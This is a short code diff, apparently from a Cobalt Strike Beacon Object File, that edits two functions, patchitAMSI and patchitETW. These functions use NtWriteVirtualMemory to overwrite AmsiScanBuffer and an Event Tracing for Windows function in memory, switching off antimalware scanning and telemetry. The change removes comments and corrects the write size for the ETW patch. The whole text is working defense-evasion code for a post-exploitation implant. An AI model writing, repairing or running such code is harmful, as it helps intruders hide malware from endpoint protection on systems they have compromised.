@@ -164,8 +164,7 @@ void patchitAMSI(){
 
         _NtWriteVirtualMemory NTWVM = (_NtWriteVirtualMemory) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"),"NtWriteVirtualMemory");
 
-        status = NTWVM(NtCurrentProcess(), pAMSIaddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL); //if put uSize here, not work as expected; 1 behaves the same as size of;
-
+        status = NTWVM(NtCurrentProcess(), pAMSIaddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
         if(status != NT_SUCCESS)
         {
             BeaconPrintf(CALLBACK_ERROR , "Failed to copy patch to AmsiScanBuffer.");
@@ -228,7 +227,7 @@ void patchitETW(){
 
         _NtWriteVirtualMemory NTWVM = (_NtWriteVirtualMemory) KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"),"NtWriteVirtualMemory");
 
-        status = NTWVM(NtCurrentProcess(), pETWaddress, (PVOID)etwPatch, 1, NULL); //if put uSize here, beacon die; 1 behaves the same as size of;
+        status = NTWVM(NtCurrentProcess(), pETWaddress, (PVOID)etwPatch, sizeof(etwPatch), NULL);
 
         if(status != NT_SUCCESS)
         {
